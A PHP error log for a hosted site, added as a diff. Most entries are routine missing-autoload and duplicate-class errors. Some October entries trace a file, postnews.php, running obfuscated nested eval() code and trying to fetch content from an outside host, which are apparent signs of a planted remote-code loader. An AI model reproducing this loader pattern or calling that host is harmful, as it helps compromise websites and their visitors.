@@ -1,0 +1,65 @@
+[19-Sep-2025 10:08:37 UTC] PHP Warning:  require(/home/digiwbs/public_html/coin-flow.digiwbs.com/../vendor/autoload.php): Failed to open stream: No such file or directory in /home/digiwbs/public_html/coin-flow.digiwbs.com/index.php on line 14
+[19-Sep-2025 10:08:37 UTC] PHP Fatal error:  Uncaught Error: Failed opening required '/home/digiwbs/public_html/coin-flow.digiwbs.com/../vendor/autoload.php' (include_path='.:/opt/cpanel/ea-php82/root/usr/share/pear') in /home/digiwbs/public_html/coin-flow.digiwbs.com/index.php:14
+Stack trace:
+#0 {main}
+  thrown in /home/digiwbs/public_html/coin-flow.digiwbs.com/index.php on line 14
+[19-Sep-2025 10:08:53 UTC] PHP Warning:  require(/home/digiwbs/public_html/coin-flow.digiwbs.com/../vendor/autoload.php): Failed to open stream: No such file or directory in /home/digiwbs/public_html/coin-flow.digiwbs.com/index.php on line 14
+[19-Sep-2025 10:08:53 UTC] PHP Fatal error:  Uncaught Error: Failed opening required '/home/digiwbs/public_html/coin-flow.digiwbs.com/../vendor/autoload.php' (include_path='.:/opt/cpanel/ea-php82/root/usr/share/pear') in /home/digiwbs/public_html/coin-flow.digiwbs.com/index.php:14
+Stack trace:
+#0 {main}
+  thrown in /home/digiwbs/public_html/coin-flow.digiwbs.com/index.php on line 14
+[19-Sep-2025 10:19:24 UTC] PHP Warning:  require(/home/digiwbs/public_html/coin-flow.digiwbs.com/../vendor/autoload.php): Failed to open stream: No such file or directory in /home/digiwbs/public_html/coin-flow.digiwbs.com/index.php on line 14
+[19-Sep-2025 10:19:24 UTC] PHP Fatal error:  Uncaught Error: Failed opening required '/home/digiwbs/public_html/coin-flow.digiwbs.com/../vendor/autoload.php' (include_path='.:/opt/cpanel/ea-php82/root/usr/share/pear') in /home/digiwbs/public_html/coin-flow.digiwbs.com/index.php:14
+Stack trace:
+#0 {main}
+  thrown in /home/digiwbs/public_html/coin-flow.digiwbs.com/index.php on line 14
+[19-Sep-2025 10:27:07 UTC] PHP Warning:  require(/home/digiwbs/public_html/coin-flow.digiwbs.com/../vendor/autoload.php): Failed to open stream: No such file or directory in /home/digiwbs/public_html/coin-flow.digiwbs.com/index.php on line 14
+[19-Sep-2025 10:27:07 UTC] PHP Fatal error:  Uncaught Error: Failed opening required '/home/digiwbs/public_html/coin-flow.digiwbs.com/../vendor/autoload.php' (include_path='.:/opt/cpanel/ea-php82/root/usr/share/pear') in /home/digiwbs/public_html/coin-flow.digiwbs.com/index.php:14
+Stack trace:
+#0 {main}
+  thrown in /home/digiwbs/public_html/coin-flow.digiwbs.com/index.php on line 14
+[19-Sep-2025 10:27:37 UTC] PHP Warning:  require(/home/digiwbs/public_html/coin-flow.digiwbs.com/../vendor/autoload.php): Failed to open stream: No such file or directory in /home/digiwbs/public_html/coin-flow.digiwbs.com/index.php on line 14
+[19-Sep-2025 10:27:37 UTC] PHP Fatal error:  Uncaught Error: Failed opening required '/home/digiwbs/public_html/coin-flow.digiwbs.com/../vendor/autoload.php' (include_path='.:/opt/cpanel/ea-php82/root/usr/share/pear') in /home/digiwbs/public_html/coin-flow.digiwbs.com/index.php:14
+Stack trace:
+#0 {main}
+  thrown in /home/digiwbs/public_html/coin-flow.digiwbs.com/index.php on line 14
+[19-Sep-2025 10:27:54 UTC] PHP Warning:  require(/home/digiwbs/public_html/coin-flow.digiwbs.com/../vendor/autoload.php): Failed to open stream: No such file or directory in /home/digiwbs/public_html/coin-flow.digiwbs.com/index.php on line 14
+[19-Sep-2025 10:27:54 UTC] PHP Fatal error:  Uncaught Error: Failed opening required '/home/digiwbs/public_html/coin-flow.digiwbs.com/../vendor/autoload.php' (include_path='.:/opt/cpanel/ea-php82/root/usr/share/pear') in /home/digiwbs/public_html/coin-flow.digiwbs.com/index.php:14
+Stack trace:
+#0 {main}
+  thrown in /home/digiwbs/public_html/coin-flow.digiwbs.com/index.php on line 14
+[29-Sep-2025 16:44:52 UTC] PHP Fatal error:  Cannot declare class CreateLicenseActivationsTable, because the name is already in use in /home/digiwbs/public_html/coin-flow.digiwbs.com/database/migrations/create_license_activations_table.php on line 6
+[29-Sep-2025 16:49:09 UTC] PHP Fatal error:  Cannot declare class CreateLicenseActivationsTable, because the name is already in use in /home/digiwbs/public_html/coin-flow.digiwbs.com/database/migrations/create_license_activations_table.php on line 6
+[15-Oct-2025 12:28:21 UTC] PHP Fatal error:  Cannot declare class CreateLicenseActivationsTable, because the name is already in use in /home/digiwbs/public_html/coin-flow.digiwbs.com/database/migrations/create_license_activations_table.php on line 6
+[15-Oct-2025 12:40:26 UTC] PHP Fatal error:  Cannot declare class CreateLicenseActivationsTable, because the name is already in use in /home/digiwbs/public_html/coin-flow.digiwbs.com/database/migrations/create_license_activations_table.php on line 6
+[15-Oct-2025 12:52:53 UTC] PHP Fatal error:  Cannot declare class CreateLicenseActivationsTable, because the name is already in use in /home/digiwbs/public_html/coin-flow.digiwbs.com/database/migrations/create_license_activations_table.php on line 6
+[22-Oct-2025 08:38:02 PRC] PHP Fatal error:  Uncaught Error: [] operator not supported for strings in /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php(2) : eval()'d code(1) : eval()'d code:2229
+Stack trace:
+#0 /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php(2) : eval()'d code(1): eval()
+#1 /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php(2): eval()
+#2 /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php(2): mfeDfHn5Jz0::rSjuVtb9uVW()
+#3 {main}
+  thrown in /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php(2) : eval()'d code(1) : eval()'d code on line 2229
+[22-Oct-2025 08:55:21 PRC] PHP Fatal error:  Uncaught Error: [] operator not supported for strings in /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php(2) : eval()'d code(1) : eval()'d code:2229
+Stack trace:
+#0 /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php(2) : eval()'d code(1): eval()
+#1 /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php(2): eval()
+#2 /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php(2): mfeDfHn5Jz0::rSjuVtb9uVW()
+#3 {main}
+  thrown in /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php(2) : eval()'d code(1) : eval()'d code on line 2229
+[22-Oct-2025 08:55:30 PRC] PHP Fatal error:  Uncaught Error: [] operator not supported for strings in /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php(2) : eval()'d code(1) : eval()'d code:2229
+Stack trace:
+#0 /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php(2) : eval()'d code(1): eval()
+#1 /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php(2): eval()
+#2 /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php(2): mfeDfHn5Jz0::rSjuVtb9uVW()
+#3 {main}
+  thrown in /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php(2) : eval()'d code(1) : eval()'d code on line 2229
+[22-Oct-2025 08:57:07 PRC] PHP Fatal error:  Uncaught Error: [] operator not supported for strings in /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php(2) : eval()'d code(1) : eval()'d code:2229
+Stack trace:
+#0 /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php(2) : eval()'d code(1): eval()
+#1 /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php(2): eval()
+#2 /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php(2): mfeDfHn5Jz0::rSjuVtb9uVW()
+#3 {main}
+  thrown in /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php(2) : eval()'d code(1) : eval()'d code on line 2229
+[22-Oct-2025 01:17:04 UTC] PHP Warning:  file_get_contents(): http:// wrapper is disabled in the server configuration by allow_url_fopen=0 in /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php on line 2
+[22-Oct-2025 01:17:04 UTC] PHP Warning:  file_get_contents(http://zs642v13ko.rowte.wiki/?lc=auto_code&amp;c=aHR0cDovL3pzNjQydjEza28ucm93dGUud2lraS8=&amp;xian_dan_num=5&amp;http_host=coin-flow.digiwbs.com&amp;jc=1&amp;htaccess=1&amp;robots=1&amp;auto_file_name=postnews.php&amp;lai_yuan=1&amp;t=1761093371-bc5ba2eed4bd8127d65803b7018537da): Failed to open stream: no suitable wrapper could be found in /home/digiwbs/public_html/coin-flow.digiwbs.com/postnews.php on line 2
